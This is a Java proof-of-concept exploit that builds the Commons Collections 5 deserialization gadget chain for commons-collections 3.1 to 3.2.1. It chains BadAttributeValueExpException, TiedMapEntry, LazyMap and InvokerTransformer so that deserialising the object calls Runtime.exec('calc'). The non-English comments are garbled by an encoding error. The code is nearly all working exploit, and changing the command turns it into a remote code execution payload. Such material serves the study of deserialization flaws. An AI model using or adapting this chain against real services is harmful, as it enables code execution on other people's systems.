package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        /**
         * ���Ի�����3.1-3.2.1��jdk1.8
         * ��������TiedMapEntry������LazyMap.get(),ֻ�������Ǹı��� LazyMap.get() �Ĵ�����ʽ��
         * ���ٺ� CC1 �� CC3 һ������ AnnotationInvocationHandler �ķ����л�����
         *
         * ->BadAttributeValueExpException.readObject()
         *       ->TiedMapEntry.toString()
         *           ->TiedMapEntry.getValue()
         *             ->LazyMap.get()
         *                 ->ChainedTransformer.transform()
         *                     ->ConstantTransformer.transform()
         *                             ->InvokerTransformer.transform()
         *                                 ->��������
         *
         */

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //ChainedTransformerʵ��
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMapʵ��
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry ʵ��
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException ʵ��
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //�������� val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //���л�
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        //���Է����л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
